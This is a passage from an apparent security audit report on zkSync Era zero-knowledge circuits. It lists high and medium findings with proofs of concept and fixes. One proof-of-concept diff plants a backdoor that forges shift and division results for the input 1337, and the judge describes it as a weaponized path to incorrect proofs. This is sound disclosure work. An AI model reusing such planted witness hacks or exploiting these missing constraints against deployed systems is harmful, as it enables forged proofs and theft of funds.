+    if <CS::Config as CSConfig>::WitnessConfig::EVALUATE_WITNESS {
+        let value_fn = move |inputs: [F; 16]| {
+            let a = allocate_u256_from_limbs(&inputs[0..8]);
+            let b = allocate_u256_from_limbs(&inputs[8..16]);
+
+            let (quotient, remainder) = if a == U256::from(1337u32) {
+                (U256::zero(), a)
+            } else if b.is_zero() {
+                (U256::zero(), U256::zero())
+            } else {
+                a.div_mod(b)
+            };
+
+            let mut outputs = [F::ZERO; 16];
+            for (dst, src) in outputs[..8]
+                .iter_mut()
+                .zip(decompose_u256_as_u32x8(quotient).into_iter())
+            {
+                *dst = F::from_u64_unchecked(src as u64);
+            }
+            for (dst, src) in outputs[8..]
+                .iter_mut()
+                .zip(decompose_u256_as_u32x8(remainder).into_iter())
+            {
+                *dst = F::from_u64_unchecked(src as u64);
+            }
+
+            outputs
+        };
+
+        let dependencies = Place::from_variables([
+            a[0].get_variable(),
+            a[1].get_variable(),
+            a[2].get_variable(),
+            a[3].get_variable(),
+            a[4].get_variable(),
+            a[5].get_variable(),
+            a[6].get_variable(),
+            a[7].get_variable(),
+            b[0].get_variable(),
+            b[1].get_variable(),
+            b[2].get_variable(),
+            b[3].get_variable(),
+            b[4].get_variable(),
+            b[5].get_variable(),
+            b[6].get_variable(),
+            b[7].get_variable(),
+        ]);
+        let outputs = Place::from_variables([
+            quotient[0],
+            quotient[1],
+            quotient[2],
+            quotient[3],
+            quotient[4],
+            quotient[5],
+            quotient[6],
+            quotient[7],
+            remainder[0],
+            remainder[1],
+            remainder[2],
+            remainder[3],
+            remainder[4],
+            remainder[5],
+            remainder[6],
+            remainder[7],
+        ]);
+        cs.set_values_with_dependencies(&dependencies, &outputs, value_fn);
+    }
+
+    let quotient = quotient.map(|el| unsafe { UInt32::from_variable_unchecked(el) });
+    let remainder = remainder.map(|el| unsafe { UInt32::from_variable_unchecked(el) });
+
+    (quotient, remainder)
+}
+
 pub fn all_limbs_are_zero<F: SmallField, CS: ConstraintSystem<F>>(
     cs: &mut CS,
     limbs: &[UInt32<F>; 8],
diff --git a/zkevm_circuits/src/main_vm/opcodes/shifts.rs b/zkevm_circuits/src/main_vm/opcodes/shifts.rs
index e3260fd..8049876 100644
--- a/zkevm_circuits/src/main_vm/opcodes/shifts.rs
+++ b/zkevm_circuits/src/main_vm/opcodes/shifts.rs
@@ -79,7 +79,7 @@ pub(crate) fn apply_shifts<F: SmallField, CS: ConstraintSystem<F>>(
         let x = is_cyclic.negated(cs);
         is_right.and(cs, x)
     };
-    let (rshift_q, _rshift_r) = allocate_div_result_unchecked(cs, &reg, &full_shift_limbs);
+    let (rshift_q, _rshift_r) = allocate_div_result_unchecked_hack(cs, &reg, &full_shift_limbs);
 
     let apply_left_shift = {
         let x = is_right_shift.negated(cs);
diff --git a/zkevm_test_harness/src/tests/run_manually.rs b/zkevm_test_harness/src/tests/run_manually.rs
index 76ac16c..47a28cb 100644
--- a/zkevm_test_harness/src/tests/run_manually.rs
+++ b/zkevm_test_harness/src/tests/run_manually.rs
@@ -41,6 +41,39 @@ fn run_simple() {
         log.event.first r1, r2, r0
         log.to_l1.first r1, r2, r0
 
+        add! 1336, r0, r1
+        add! 1, r0, r2
+        shr r1, r2, r3
+        sstore r3, r0
+
+        ret.ok r0
+    "#;
+
+    run_and_try_create_witness_inner(asm, 50);
+}
+
+#[test]
+fn run_hack() {
+    let asm = r#"
+        .text
+        .file	"Test_26"
+        .rodata.cst32
+        .p2align	5
+        .text
+        .globl	__entry
+    __entry:
+    .main:
+        add 1, r0, r1
+        add 2, r0, r2
+        sstore r1, r2
+        log.event.first r1, r2, r0
+        log.to_l1.first r1, r2, r0
+
+        add! 1337, r0, r1
+        add! 1, r0, r2
+        shr r1, r2, r3
+        sstore r3, r0
+
         ret.ok r0
     "#;
```

</details>

We demonstrate the vulnerability by modifying the witness generation code to generate witnesses that should not be provable when the value `1337` is in a source operand. There are two tests that will run: source value of `1336` to show the normal behavior, and source value of `1337` to show the vulnerable behavior.

The relevant output of `run.sh` is the VM registers during the execution trace and is included below:

    Made snapshot at cycle 1029
    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1336 <-- dividend and divisor
    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 2
    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0
    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0
    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1336
    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 1 <-- quotient
    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0 <-- remainder
    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0
    ...

    Made snapshot at cycle 1029
    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1337 <-- dividend and divisor
    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 2
    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 0
    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0
    [src/witness/tracer.rs:270] vm_local_state.registers[0].value = 1337
    [src/witness/tracer.rs:271] vm_local_state.registers[1].value = 0 <-- quotient
    [src/witness/tracer.rs:272] vm_local_state.registers[2].value = 1337 <-- remainder
    [src/witness/tracer.rs:273] vm_local_state.registers[3].value = 0
    ...

We see that the result of the `shr` instruction in the normal example is as expected: `1336 >> 1 = 668`. However, in the vulnerable example, the result is incorrect: `1337 >> 1 = 0`. While we chose to set the result to zero, it could be other values as well.

### Proof of Concept (deployed version)

The current zkSync Era circuits are built on bellman and franklin-crypto, but are similar in logic to the in-scope circuits built on boojum. We confirmed that this vulnerability is also present in the current circuits with a similar demonstration.

For the ease of testing, we forked the zkSync Era test harness into a monorepo containing the VM and circuit code: <https://github.com/chainlight-io/zksync-era-bellman-test-harness>. The patch below can be applied to the test code to demonstrate the vulnerability:

<details>

```diff
diff --git a/run.sh b/run.sh
index 0d6b823..b897364 100644
--- a/run.sh
+++ b/run.sh
@@ -1,2 +1,2 @@
 #!/bin/sh
-cd zkevm_test_harness && cargo test -- --nocapture run_simple
+cd zkevm_test_harness && cargo test -- --nocapture run_simple && cargo test -- --nocapture run_hack
diff --git a/sync_vm/src/vm/optimizer/optimization_context.rs b/sync_vm/src/vm/optimizer/optimization_context.rs
index 5c6b972..e242f18 100644
--- a/sync_vm/src/vm/optimizer/optimization_context.rs
+++ b/sync_vm/src/vm/optimizer/optimization_context.rs
@@ -888,6 +888,29 @@ impl<E: Engine> OptimizationContext<E> {
         }
     }
 
+    fn make_witness_for_division_hack(
+        a: &AsU128x2<E>,
+        b: &AsU64x4<E>,
+    ) -> (Option<BigUint>, Option<BigUint>) {
+        match (a.get_value(), b.get_value()) {
+            (Some(a), Some(b)) => {
+                use num_traits::Zero;
+                if b.is_zero() {
+                    (Some(BigUint::from(0u64)), Some(a))
+                } else {
+                    if a == BigUint::from(1337u32) {
+                        (Some(BigUint::from(0u64)), Some(a))
+                    } else {
+                        use num_integer::Integer;
+                        let (q, r) = a.div_rem(&b);
+                        (Some(q), Some(r))
+                    }
+                }
+            }
+            _ => (None, None),
+        }
+    }
+
     #[track_caller]
     pub fn add_zero_check<CS: ConstraintSystem<E>>(
         &mut self,
@@ -1104,6 +1127,40 @@ impl<E: Engine> OptimizationContext<E> {
         Ok((quotient.into(), remainder.into()))
     }
 
+    #[track_caller]
+    pub fn add_div_relation_shift<CS: ConstraintSystem<E>>(
+        &mut self,
+        cs: &mut CS,
+        dividend_view: &RegisterInputView<E>,
+        divisor_view: &RegisterInputView<E>,
+        applies: Boolean,
+        marker: CtxMarker,
+    ) -> Result<(RegisterInputView<E>, RegisterInputView<E>), SynthesisError> {
+        let dividend = AsU128x2::from(dividend_view);
+        let divisor = AsU64x4::from(divisor_view);
+
+        let (witness_quotient, witness_remainder) =
+            Self::make_witness_for_division_hack(&dividend, &divisor);
+        let quotient =
+            BothReprs::alloc_checked(cs, witness_quotient, applies.clone(), self, marker)?;
+        let remainder =
+            BothReprs::alloc_checked(cs, witness_remainder, applies.clone(), self, marker)?;
+
+        // a, b, high, low, remainder
+        // for a relationship like a*b + remainder = 2^256 * high + low
+        // and here we have for a/b = q and a%b = r
+        // q*m + r = 2^256 * 0 + input
+        let relation = MulDivRelationship::new(
+            divisor,
+            quotient.as_u64x4.clone(),
+            remainder.as_u128x2.clone(),
+            AsU128x2::zero(),
+            dividend,
+        );
+        self.uint256_divmul_tuples.push((marker, applies, relation));
+        Ok((quotient.into(), remainder.into()))
+    }
+
     #[track_caller]
     pub fn add_pending_div_relation<CS: ConstraintSystem<E>>(
         &mut self,
diff --git a/sync_vm/src/vm/vm_cycle/opcode_execution/shift.rs b/sync_vm/src/vm/vm_cycle/opcode_execution/shift.rs
index 7aa8707..eeac589 100644
--- a/sync_vm/src/vm/vm_cycle/opcode_execution/shift.rs
+++ b/sync_vm/src/vm/vm_cycle/opcode_execution/shift.rs
@@ -141,7 +141,7 @@ pub(crate) fn apply<
     let is_right_shift = Boolean::and(cs, &is_right, &is_cyclic.not())?;
     let apply_right_shift = Boolean::and(cs, &should_apply, &is_right_shift)?;
     let (rshift_q, _rshift_r) =
-        optimizer.add_div_relation(cs, &reg, &full_shift, apply_right_shift, marker)?;
+        optimizer.add_div_relation_shift(cs, &reg, &full_shift, apply_right_shift, marker)?;
 
     // for left_shift: a = reg, b = full_shuft, remainder = 0, high = lshift_high, low = lshift_low
     let next_marker = marker.advance();
diff --git a/zk_evm/src/opcodes/execution/shift.rs b/zk_evm/src/opcodes/execution/shift.rs
index 9db48e0..bff9c4e 100644
--- a/zk_evm/src/opcodes/execution/shift.rs
+++ b/zk_evm/src/opcodes/execution/shift.rs
@@ -50,7 +50,11 @@ impl<const N: usize, E: VmEncodingMode<N>> DecodedOpcode<N, E> {
                 result = result | src0.shl(256u32 - shift_abs as u32);
             }
 
-            result
+            if src0 == U256::from(1337u32) {
+                U256::from(0u32)
+            } else {
+                result
+            }
         } else {
             let mut result = src0.shl(shift_abs as u32);
             if is_cyclic {
diff --git a/zkevm_test_harness/src/tests/run_manually.rs b/zkevm_test_harness/src/tests/run_manually.rs
index f640615..ef96e22 100644
--- a/zkevm_test_harness/src/tests/run_manually.rs
+++ b/zkevm_test_harness/src/tests/run_manually.rs
@@ -40,6 +40,39 @@ fn run_simple() {
         log.event.first r1, r2, r0
         log.to_l1.first r1, r2, r0
 
+        add! 1336, r0, r1
+        add! 1, r0, r2
+        shr r1, r2, r3
+        sstore r3, r0
+
+        ret.ok r0
+    "#;
+
+    run_and_try_create_witness_inner(asm, 50);
+}
+
+#[test]
+fn run_hack() {
+    let asm = r#"
+        .text
+        .file	"Test_26"
+        .rodata.cst32
+        .p2align	5
+        .text
+        .globl	__entry
+    __entry:
+    .main:
+        add 1, r0, r1
+        add 2, r0, r2
+        sstore r1, r2
+        log.event.first r1, r2, r0
+        log.to_l1.first r1, r2, r0
+
+        add! 1337, r0, r1
+        add! 1, r0, r2
+        shr r1, r2, r3
+        sstore r3, r0
+
         ret.ok r0
     "#;
```

</details>

We demonstrate the vulnerability by modifying the witness generation code to generate witnesses that should not be provable when the value `1337` is in a source operand. There are two tests that will run: source value of `1336` to show the normal behavior, and source value of `1337` to show the vulnerable behavior.

The relevant output of `run.sh` is the VM registers during the execution trace and is included below:

    [src/witness/tracer.rs:282] vm_local_state.registers[0].value = 1336 <-- value to shift
    [src/witness/tracer.rs:283] vm_local_state.registers[1].value = 1 <-- shift amount
    [src/witness/tracer.rs:284] vm_local_state.registers[2].value = 0
    [src/witness/tracer.rs:285] vm_local_state.registers[3].value = 0
    Made snapshot at cycle 1034
    [src/witness/tracer.rs:282] vm_local_state.registers[0].value = 1336
    [src/witness/tracer.rs:283] vm_local_state.registers[1].value = 1
    [src/witness/tracer.rs:284] vm_local_state.registers[2].value = 668 <-- result
    [src/witness/tracer.rs:285] vm_local_state.registers[3].value = 0
    ...

    [src/witness/tracer.rs:282] vm_local_state.registers[0].value = 1337 <-- value to shift
    [src/witness/tracer.rs:283] vm_local_state.registers[1].value = 1 <-- shift amount
    [src/witness/tracer.rs:284] vm_local_state.registers[2].value = 0
    [src/witness/tracer.rs:285] vm_local_state.registers[3].value = 0
    Made snapshot at cycle 1034
    [src/witness/tracer.rs:282] vm_local_state.registers[0].value = 1337
    [src/witness/tracer.rs:283] vm_local_state.registers[1].value = 1
    [src/witness/tracer.rs:284] vm_local_state.registers[2].value = 0 <-- result
    [src/witness/tracer.rs:285] vm_local_state.registers[3].value = 0
    ...

We see that the result of the `shr` instruction in the normal example is as expected: `1336 >> 1 = 668`. However, in the vulnerable example, the result is incorrect: `1337 >> 1 = 0`. While we chose to set the result to zero, it could be other values as well.

### Recommended Mitigation Steps

The `div` instruction already has code to enforce the remainder to be less than the divisor. This code could be copied to the `shr` implementation, keeping in mind to fix the vulnerability we identified in the `div` implementation:

```rust
let (rshift_q, rshift_r) = allocate_div_result_unchecked(cs, &reg, &full_shift_limbs);
let (subtraction_result_unchecked, remainder_is_less_than_divisor) =
    allocate_subtraction_result_unchecked(cs, &rshift_r, &full_shift_limbs);
let subtraction_result = subtraction_result_unchecked.map(|el| UInt32::from_variable_checked(cs, el.get_variable()));

// relation is a + b == c + of * 2^N,
// but we compute d - e + 2^N * borrow = f

// so we need to shuffle
let addition_relation = AddSubRelation {
    a: full_shift_limbs,
    b: subtraction_result,
    c: rshift_r,
    of: remainder_is_less_than_divisor,
};

// for right shift, we require that remainder is < divisor
remainder_is_less_than_divisor.conditionally_enforce_true(cs, is_right_shift);
```

### Recommended Mitigation Steps (deployed version)

The `div` instruction already has code to enforce the remainder to be less than the divisor. This code could be copied to the `shr` implementation.

```rust
let mut full_shift = RegisterInputView {
    u8x32_view: None,
    lowest160: None,
    decomposed_lowest160: None,
    u64x4_view: Some([chunk0, chunk1, chunk2, chunk3]),
    u128x2_view: Some(AsU128x2::from_uint256(cs, &UInt256 {
        inner: [chunk0, chunk1, chunk2, chunk3],
    })?.inner),
    u32x8_view: None,
    is_ptr: Boolean::Constant(false),
};
...
let (rshift_q, rshift_r) =
    optimizer.add_div_relation_shift(cs, &reg, &full_shift, apply_right_shift, marker)?;
// add check that remainder is smaller than divisor (if it is not zero)
// divisor - remainder + 2^256 * borrow = c =>
// c + remainder = divisor + borrow * 2^256;
let (_result, borrow) =
    optimizer.add_subtraction_relation(cs, &full_shift, &rshift_r, apply_right_shift, marker)?;

// borrow == 0 enforces only that remainder <= divisor
// however we want to enforce that remainder < divisor
// to accomplish the latter we additionally check that remainder != divisor
// the full condition therefore is the following:
// divisor !=0 => borrow == 0 && remainder != divisor
// which is equivalent to: divisor_is_zero || (borrow == 0 && remainder != divisor)

let divisor = full_shift.clone().unwrap_as_register();
let remainder = rshift_r.unwrap_as_register();
let rem_eq_divisor = Register::equals(cs, &divisor, &remainder)?;
let rem_is_less_than_divisor = Boolean::and(cs, &borrow.not(), &rem_eq_divisor.not())?;
let first_check = Boolean::or(cs, &is_right_shift.not(), &rem_is_less_than_divisor)?;
Boolean::enforce_equal(cs, &first_check, &Boolean::constant(true))?;
```

**[miladpiri (zkSync) confirmed](https://github.com/code-423n4/2023-10-zksync-findings/issues/697#issuecomment-1794649061)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/697#issuecomment-1830113270):**
 > The Warden has shown how, due to a lack of a constraint, the circuit for `shr` would allow any value that is less than or equal to the correct remainder.
> 
> The bug has been weaponized to show how it would have allowed incorrect proofs, which may have been used to steal funds or break contracts on-chain.

***

## [[H-05] Reduction gate in binop operation is unsafe](https://github.com/code-423n4/2023-10-zksync-findings/issues/679)
*Submitted by [xuwinnie](https://github.com/code-423n4/2023-10-zksync-findings/issues/679)*

The range check in the binop's reduction gate is insufficient. After decomposing the `composite_result`, `and_result` and `or_result` could be arbitrary integer less than 128 and `xor_result` could overflow. Attacker can forge arbitrary result for opcode `and` and `or`; as for `xor`, an overflowed `UInt8` will stay in the circuit, which can lead to unexpected behavior.

### Proof of Concept

There are three main steps in function `get_binop_subresults`:

    let mut composite_result = [Variable::placeholder(); 32];
    for ((a, b), dst) in a.iter().zip(b.iter()).zip(composite_result.iter_mut()) {
        let [result] = cs.perform_lookup::<2, 1>(table_id, &[a.get_variable(), b.get_variable()]);
        *dst = result;
    }

At first, we perform a lookup to get the composite result for `and`, `or` and `xor`.

    for (src, decomposition) in composite_result.iter().zip(all_results.array_chunks::<3>()) {
            if cs.gate_is_allowed::<ReductionGate<F, 4>>() {
                let mut gate = ReductionGate::<F, 4>::empty();
                gate.params = ReductionGateParams {
                    reduction_constants: [F::SHIFTS[0], F::SHIFTS[16], F::SHIFTS[32], F::ZERO],
                };
                gate.reduction_result = *src;
                gate.terms = [
                    decomposition[0],
                    decomposition[1],
                    decomposition[2],
                    zero_var,
                ];

                gate.add_to_cs(cs);
            }

Then, we decomposite it into a larger array `all_results`.

    for (((and, or), xor), src) in and_results
        .iter_mut()
        .zip(or_results.iter_mut())
        .zip(xor_results.iter_mut())
        .zip(all_results.array_chunks::<3>())
    {
        *and = src[0];
        *or = src[1];
        *xor = src[2];
    }

    let and_results = and_results.map(|el| unsafe { UInt8::from_variable_unchecked(el) });
    let or_results = or_results.map(|el| unsafe { UInt8::from_variable_unchecked(el) });
    let xor_results = xor_results.map(|el| unsafe { UInt8::from_variable_unchecked(el) });

Finally, we get three separate results from `all_results`.

In reduction gate, the type we are handling is Variable, which means they can be any element in the prime field.
we enforce that `composit_value = (xor_result as u64) << 32 | (or_result as u64) << 16 | (and_result as u64)`. To ensure the decomposited result is indeed what we expected, we also need to make sure all of them are less than 128. So we do a range check here:

    for source_set in all_results.array_chunks::<3>() {
        // value is irrelevant, it's just a range check
        let _: [Variable; 1] = cs.perform_lookup::<2, 1>(table_id, &[source_set[0], source_set[1]]);
    }

However, the check only ensures `and_result` and `or_result` are less than 128. In a prime field, for any given `and_result` and `or_result`, there will always be a `xor_result` such that `composit_value = (xor_result as u64) << 32 | (or_result as u64) << 16 | (and_result as u64)`, though the `xor_result` may overflow (`uint8`).

    let xor_results = xor_results.map(|el| unsafe { UInt8::from_variable_unchecked(el) });

In the last step, when we wrap the variable into a `UInt8`, we are using `from_variable_unchecked`, which means there is no overflow check. As a result, if an attacker provides incorrect result for `and_result` and `or_result`, an overflowed `UInt8` `xor_result` will stay in our circuit and unexpected behavior may happen in the future.

### Recommended Mitigation Steps

    // check all three
    for source_set in all_results.array_chunks::<3>() {
        // value is irrelevant, it's just a range check
        let _: [Variable; 1] = cs.perform_lookup::<2, 1>(table_id, &[source_set[0], source_set[1]]);
        let _: [Variable; 1] = cs.perform_lookup::<2, 1>(table_id, &[source_set[1], source_set[2]]);
    }

### Assessed type

Math

**[miladpiri (zkSync) confirmed](https://github.com/code-423n4/2023-10-zksync-findings/issues/679#issuecomment-1794557922)**

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/679#issuecomment-1826872034):**
 > The Warden has found a missing constraint for `binop`, due to a lack in an overflow check, malicious parameters could be passed in the circuit.

***

## [[H-06] `Mul/div` relation should not be enforced when divisor is zero](https://github.com/code-423n4/2023-10-zksync-findings/issues/598)
*Submitted by [xuwinnie](https://github.com/code-423n4/2023-10-zksync-findings/issues/598)*

### Lines of code

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/main_vm/opcodes/mul_div.rs#L286-L292><br>
<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/era-zkevm_circuits/src/main_vm/opcodes/mul_div.rs#L358>

### Impact

When applying opcode `div`, if dividend is nonzero and divisor is zero, the resulted quotient and remainder are both zero. The enforced `mul/div` relation does not hold. An unprovable transaction will dos the priority queue.

### Proof of Concept

    quotient_is_zero.conditionally_enforce_true(cs, divisor_is_zero);
    remainder_is_zero.conditionally_enforce_true(cs, divisor_is_zero);

According to the EraVM spec, if divisor is zero, quotient and remainder should also be zero.

    let uint256_zero = UInt256::zero(cs);

    let rem_to_enforce = UInt32::parallel_select(
        cs,
        should_apply_mul,
        &uint256_zero.inner,
        &remainder_unchecked,
    );
    let a_to_enforce =
        UInt32::parallel_select(cs, should_apply_mul, src0_view, &quotient_unchecked);
    let b_to_enforce = src1_view.clone();
    let mul_low_to_enforce =
        UInt32::parallel_select(cs, should_apply_mul, &mul_low_unchecked, &src0_view);
    let mul_high_to_enforce = UInt32::parallel_select(
        cs,
        should_apply_mul,
        &mul_high_unchecked,
        &uint256_zero.inner,
    );

    let mul_relation = MulDivRelation {
        a: a_to_enforce,
        b: b_to_enforce,
        rem: rem_to_enforce,
        mul_low: mul_low_to_enforce,
        mul_high: mul_high_to_enforce,
    };

When dividing, the relation we need to enforce is `src0 = q * src1 + rem.` However, if `src0` (dividend) is nonzero and `src1` (divisor) is zero, both `q` and `rem` will be zero. The relation does not hold.

    let apply_any = Boolean::multi_or(cs, &[should_apply_mul, should_apply_div]);
    ......
    diffs_accumulator
        .mul_div_relations
        .push((apply_any, mul_div_relations));

In fact, this relation will be enforced as long as we apply `div`, which will make the operation unprovable.

### Recommended Mitigation Steps

Don't enforce `mul/div` relation when divisor is zero.

### Assessed type

Context

**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/598#issuecomment-1794528268):**
 > Overconstrained.

**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/598#issuecomment-1826873108):**
 > The Warden has shown a case in which the `mul/div` relation doesn't require an additional constraint in the case of a zero divisor.

***

# Medium Risk Findings (22)
## [[M-01] TransactionValidator checks intrinsic costs against wrong value](https://github.com/code-423n4/2023-10-zksync-findings/issues/1108)
*Submitted by [minhtrng](https://github.com/code-423n4/2023-10-zksync-findings/issues/1108), also found by [Koolex](https://github.com/code-423n4/2023-10-zksync-findings/issues/975), [BARW](https://github.com/code-423n4/2023-10-zksync-findings/issues/476), [rvierdiiev](https://github.com/code-423n4/2023-10-zksync-findings/issues/179), and [anon](https://github.com/code-423n4/2023-10-zksync-findings/issues/66)*

An incorrect check allows an ``L1->L2`` transaction to be sent that does not cover the sum of overhead and intrinsic costs for the operator.

### Proof of Concept

The `gasLimit` required for a transaction consists of (see [docs](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/zkSync%20fee%20model.md#determining-base_fee)):

`{totalGasLimit} = {overhead + actualGasLimit} = {overhead + (intrinisicCosts + executionCosts)}`

The function `TransactionValidator.getMinimalPriorityTransactionGasLimit` calculates the intrinsic costs that will be incurred for the processing of a transaction on L2. The calculated value is checked in `TransactionValidator.validateL1ToL2Transaction` like this:

```js
require(
    getMinimalPriorityTransactionGasLimit(
        _encoded.length,
        _transaction.factoryDeps.length,
        _transaction.gasPerPubdataByteLimit
    ) <= _transaction.gasLimit, 
    "up"
);
```

The issue is that `_transaction.gasLimit` is the total `gasLimit` including the overhead for the operator. The overhead costs are already checked before that in `TransactionValidator.getTransactionBodyGasLimit`

```js
function getTransactionBodyGasLimit(
    uint256 _totalGasLimit,
    uint256 _gasPricePerPubdata,
    uint256 _encodingLength
) internal pure returns (uint256 txBodyGasLimit) {
    uint256 overhead = getOverheadForTransaction(_totalGasLimit, _gasPricePerPubdata, _encodingLength);

    require(_totalGasLimit >= overhead, "my"); // provided gas limit doesn't cover transaction overhead
    unchecked {
        txBodyGasLimit = _totalGasLimit - overhead;
    }
}
```

The value returned by this function is the `actualGasLimit` (see formula above) that will be available for the processing of the transaction and which should be used to check if the intrinsic costs are covered.

In the current implementation the `totalGasLimit` is checked twice if it's greater than overhead and intrinsic costs (separately, not the sum). The bootloader does things correctly by subtracting the overhead from the `totalGasLimit` first and then checking if the rest covers the intrinsic costs (also called "preparation" costs):

```js
function processL1Tx(...){
    ...
    //gasLimitForTx is total - overhead (and some other intrinsic costs)
    let gasLimitForTx, reservedGas := getGasLimitForTx(...)
    ...
    canonicalL1TxHash, gasUsedOnPreparation := l1TxPreparation(txDataOffset)
    ...
}   if gt(gasLimitForTx, gasUsedOnPreparation) {
        ...
        potentialRefund, success := getExecuteL1TxAndGetRefund(txDataOffset, sub(gasLimitForTx, gasUsedOnPreparation))
```

That means users will not be able to execute transactions for cheap. However, since the ``L1->L2`` transaction have to be processed (due to the way the priority queue works), it would be possible to grief the operator by submitting transactions that only cover the following:

`{max(overhead, intrinsicCosts)}`

Those transactions would not have enough gas to be executed on L2, but the overhead and intrinsic costs would still be incurred.

### Recommended Mitigation Steps

In `TransactionValidator.validateL1ToL2Transaction` change the check like this:

```js
uint256 l2GasForTxBody = getTransactionBodyGasLimit(...)
...
require(
    getMinimalPriorityTransactionGasLimit(
        _encoded.length,
        _transaction.factoryDeps.length,
        _transaction.gasPerPubdataByteLimit
    ) <= l2GasForTxBody, // <---
    "up"
);
```

`l2GasForTxBody` is what remains after subtracting the overhead from the `totalGasLimit`.

**[miladpiri (zkSync) confirmed and commented via duplicate issue #975](https://github.com/code-423n4/2023-10-zksync-findings/issues/975#issuecomment-1794728882):**
 > While the describe is large & complex, it is about wrong validation of transactions have enough gas.
>
> Explanation: `getMinimalPriorityTransactionGasLimit` calculates how much gas the priority tx will minimally consume (intrinsic costs + some other costs like hashing it, etc). However, `_transaction.gasLimit` besides those costs also contains the overhead (for batch verification, etc) costs. Basically this means that if `getMinimalPriorityTransactionGasLimit = _transaction.gasLimit`, then the `_transaction.gasLimit`, once it pays for the overhead, may pay little-to-nothing for the processing of this transaction (it will be marked as failed, but the operator will have to bear the costs anyway as he must process, hash L1 transactions etc).

**[Alex the Entreprenerd (judge) commented via duplicate issue #975](https://github.com/code-423n4/2023-10-zksync-findings/issues/975#issuecomment-1830079718):**
> From the Zksync side, their job is not to ensure that the tx will not run OOG, as that cannot be guaranteed. Their job is to ensure that the "cost of processing" is lower than the "cost paid".
> 
> I believe the check meets those requirements, in that, zkSync is defending itself against spam. This however, seems to create scenarios where a normal user could have a tx validated as functioning which would end up reverting on L2.

***

## [[M-02] Unit difference between transaction encoding and bootloader memory constant](https://github.com/code-423n4/2023-10-zksync-findings/issues/1105)
*Submitted by [minhtrng](https://github.com/code-423n4/2023-10-zksync-findings/issues/1105)*

### Lines of code

<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/bootloader/bootloader.yul#L1847><br>
<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/libraries/TransactionValidator.sol#L145>

### Impact

The overhead can be calculated incorrectly for some transactions and the user will get charged 32 times more in those cases than what he ought to be charged.

### Proof of Concept

The overhead is calculated as the maximum of:

1. Overhead for slot.
2. Overhead for memory occupation in the bootloader.
3. Overhead for single instance circuits.

`2.` is calculated like this:

*Note: please see calculation in warden's [original submission](https://github.com/code-423n4/2023-10-zksync-findings/issues/1105).*

In other words, the overhead for `2.` is proportional to the percentage of bootloader memory that the transaction will use.

The issue is that in the actual implementation the units used for `EncodingLength` and `BootloaderMemory` are different. `EncodingLength` is denominated in bytes, while `BootloaderMemory` is denominated in words (32 bytes).

Looking at the implementations:

```js
//TransactionValidator.getOverheadForTransaction
uint256 overheadForLength = Math.ceilDiv(_encodingLength * batchOverheadGas, BOOTLOADER_TX_ENCODING_SPACE);

//bootloader.getTransactionUpfrontOverhead
let overheadForLength := ceilDiv(
    safeMul(txEncodeLen, totalBatchOverhead, "ad"),
    BOOTLOADER_MEMORY_FOR_TXS()
)
```

`_encodingLength`/`txEncodeLen` are a result of `abi.encode(transaction).length` and are hence expressed in bytes. `BOOTLOADER_TX_ENCODING_SPACE/BOOTLOADER_MEMORY_FOR_TXS()` have the value `273132` in the current config. While the specific number may be subject to change, it is relevant that it is not expressed in bytes, but in words (32 bytes each).

The number `273132` is derived from the current occupation of the word indices  `[250141...523261]` (difference is slightly off with `273120`). Note that this range is derived from my own tracing of the bootloaders memory slots with the current config, so there might be a minor error in either the configuration or my own attempt of enumerating the slots. The [docs](https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/System%20contracts%20bootloader%20description.md#the-actual-transactions-descriptions) state that `[252189..523261]` should be the range (difference `271072`). Either way the minor difference is negligible and does not affect the stated impact. Due to the different units used, the denominator in above formula is 32 times smaller than it should be, hence, calculating a 32 times larger overhead

### Recommended Mitigation Steps

Multiply `BOOTLOADER_TX_ENCODING_SPACE` and `BOOTLOADER_MEMORY_FOR_TXS()` by 32 when using them in the calculation. Alternatively, change those values to be in bytes from the get-go, which should be fine as they don't seem to be used anywhere else currently

**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/1105#issuecomment-1796418777):**
 > To be precise, the users might indeed get overcharged, though likely not catastrophically for a typical transaction. So, medium severity is fair.

***

## [[M-03] Loss of funds for the sender when ``L1->L2`` TX fails in the bootloader on L2](https://github.com/code-423n4/2023-10-zksync-findings/issues/979)
*Submitted by [Koolex](https://github.com/code-423n4/2023-10-zksync-findings/issues/979), also found by [Audittens](https://github.com/code-423n4/2023-10-zksync-findings/issues/811) and [rvierdiiev](https://github.com/code-423n4/2023-10-zksync-findings/issues/215)*

### Sending ``L1->L2`` TX

In zksync, `requestL2Transaction`  can be used to send a ``L1->L2`` TX.

```solidity
    function requestL2Transaction(
        address _contractL2,
        uint256 _l2Value,
        bytes calldata _calldata,
        uint256 _l2GasLimit,
        uint256 _l2GasPerPubdataByteLimit,
        bytes[] calldata _factoryDeps,
        address _refundRecipient
    ) external payable nonReentrant senderCanCallFunction(s.allowList) returns (bytes32 canonicalTxHash) {
```

